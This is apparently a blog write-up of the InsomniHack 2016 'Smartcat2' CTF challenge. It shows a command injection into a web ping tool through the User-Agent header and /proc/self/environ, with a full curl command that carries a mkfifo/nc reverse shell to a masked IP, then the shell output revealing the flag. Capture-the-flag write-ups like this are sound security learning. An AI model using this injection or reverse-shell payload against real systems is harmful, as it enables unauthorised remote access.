---
layout: blog_item
title:  "InsomniHack CTF Teaser - Smartcat2 Writeup"
date:   2016-01-18 14:00:10
author: Arr0way
description: 'InsomniHack Teaser CTF 2016, Smartcat2 challenge writeups.'
categories: [walkthroughs]
tags:
- burp
- 'command injection'
- CTF
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}


## Challenge Description

Exploit the web based ping command tool and capture the flag.  

![smartcat2 CTF](/img/blog/insomnihack/smartcat2.png)


## InsomniHack Smartcat 2

Due to filtering it was impossible to enter any white space in commands, making it far more difficult than the smartcat1 challenge. Initially I tried and failed to use a <code>/dev/tcp/ip/port</code> reverse shell.

### proc/self/environ Injection

The environment variable <code>HTTP_USER_AGENT=</code> which contains the contents of the <code>User-Agent:</code> field, had no filtering allowing for easy injection of a reverse shell.

Using command injection it was possible to execute <code>/proc/self/env</code> and successfully execute a reverse shell.

### Reverse Shell

Putting it all together using curl:

{% highlight bash %}
curl 'http://smartcat.insomnihack.ch/cgi-bin/index.cgi' --user-agent ';rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc XXX.XXX.XXX.XXX 80 >/tmp/f;exit' --data 'dest=%0ash</proc/self/environ'
{% endhighlight %}

The flag was not readable by <code>www-data</code>, the binary <code>readflag</code> was required to read the contents of the flag.

A couple of lines needed typing in to "confirm" you had an interactive shell, after entering the flag was displayed:

{% highlight bash %}

www-data@smartcat:/home/smartcat$ ./readflag
./readflag
Give me a...
Give me a...
... flag!
... flag!
Flag:
            ___
        .-"; ! ;"-.
      .'!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .' )
  (`. \ \ \!:|:!/ / / .')
   \ `.`.\ |!|! |/,'.' /
    `._`.\\\!!!// .'_.'
       `.`.\\|//.'.'
        |`._`n'_.'|  hjw
        "----^----"

INS{shells_are _way_better_than_cats}

www-data@smartcat:/home/smartcat$

{% endhighlight %}

Thanks for the challenge :)
